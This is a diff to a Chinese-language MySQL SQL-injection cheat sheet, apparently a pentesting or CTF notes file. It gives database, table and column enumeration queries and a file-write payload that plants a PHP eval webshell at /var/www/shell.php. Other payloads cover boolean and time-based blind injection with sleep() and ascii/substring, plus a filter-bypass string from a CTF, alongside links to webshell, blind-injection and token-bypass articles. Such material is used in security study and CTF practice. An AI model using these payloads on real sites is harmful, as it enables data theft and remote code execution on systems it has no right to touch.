@@ -11,7 +11,7 @@ SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)
 ``` 
 #### 2.查询表名
 ```
-SELECT table_name FROM information_schema.tables WHERE  table_schema=database()； 
+SELECT table_name FROM information_schema.tables WHERE  table_schema=database() 
 ```  
 #### 3.查询列名   
 tablename为表名
@@ -21,7 +21,6 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename
 ### 0x02文件读写
 前置条件：file权限
    
-
 #### 1.查询权限
 判断方法：
 `SELECT @@secure_file_priv`   
@@ -48,14 +47,18 @@ INTO OUTFILE/DUMPFILE
 ```
 SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
 ```
+其它写webshell方法:[Mysql写入Webshell](https://www.cnblogs.com/xuyangda/p/14510562.html)
 ### 0x03常用常量和函数
-@@global.secure_file_priv   
-查询版本    
-VERSION()    
-@@VERSION     
-@@GLOBAL.VERSION 
+当前用户：     
+`user()`
+查询可写安全目录：      
+`@@global.secure_file_priv`  
+查询版本:    
+`VERSION()`    
+`@@VERSION`     
+`@@GLOBAL.VERSION`     
 服务器主机名：    
-@@HOSTNAME      
+`@@HOSTNAME`      
 ## SQL注入漏洞利用
 SQL注入利用类型主要分类：
 - Union型注入
@@ -166,17 +169,45 @@ mysql> select ST_PointFromGeoHash(version(),1);
 ERROR 1411 (HY000): Incorrect geohash value: '5.7.12-log' for function st_pointfromgeohash
 ```
 ### 0x06 Bool型盲注
-and 1=1   
-and 1=2   
-AND ascii(SELECT SUBSTR(table_name,1,1) FROM information_schema.tables) =ascii( 'A')
+盲注推荐阅读：[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244)     
+判断：   
+`and 1=1`   
+`and 1=2`   
+读数据：    
+`AND ascii(SELECT SUBSTR(table_name,1,1) FROM information_schema.tables) =ascii('A')`
 ### 0x07 时间型盲注
-SLEEP()
+判断：     
+`and sleep(5)`
+读数据：    
+```
+//条件判断型：if((condition), sleep(5), 0);
+//条件判断型：CASE WHEN (condition) THEN sleep(5) ELSE 0 END;
+//无条件判断型：sleep(5*(condition))
+and if((select ord(substring(database(),1,1))) = 97,sleep(5),1)
+```
 ## 常用小技巧
 ### 1.多行合并一行   
-grouo_concat()
+
+#### concat()函数   
+多个字符串连接成一个字符串。   
+0x7e ~
 ```
-select a.*,group_concat(b.name separator '-') as name from a left join b on a.id=b.id group by a.id;   
+//这里限制limit返回一行一个字段，如果不限制，还是返回多行
+select concat(id,0x7e,name) as c from a limit 1;
 ```
+#### concat_ws()
+concat_ws() 代表 CONCAT With Separator ，是concat()的特殊形式。第一个参数是其它参数的分隔符。   
+```
+select concat('_',id,name) as c from a limit 1;
+```
+
+#### group_concat()函数
+连接一个组的所有字符串，并以逗号分隔每一条数据   
+```
+//多行结果拼接一行
+select group_concat(name) as name from a ;   
+```
+
 ### 2. 截取字符串
 left(),right(),substring(),substring_index()   
 如果显示有字数限制，对于过长的字符串需要分部分截取。
@@ -204,10 +235,19 @@ SELECT SUBSTRING_INDEX('web-exp-mysql', '.', -2);
 ### 1.bypass WAF
 - [sql-injection-fuck-waf](https://notwhy.github.io/2018/06/sql-injection-fuck-waf/)
 ### 2.bypass 过滤函数
-过滤
+过滤:
+```
 gtid_subset|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|hash|sleep|benchmark| |;|\*|\+|-|/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`
+```
+绕过
 ```
 'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')
 ```
 ### 3.bypass Token保护
 - [Burpsuite+SQLMAP双璧合一绕过Token保护的应用进行注入攻击](https://www.freebuf.com/sectool/128589.html)
+
+## Ref
+- https://www.cnblogs.com/xuyangda/p/14510562.html
+- https://www.anquanke.com/post/id/266244
+- https://www.freebuf.com/sectool/128589.html
+  
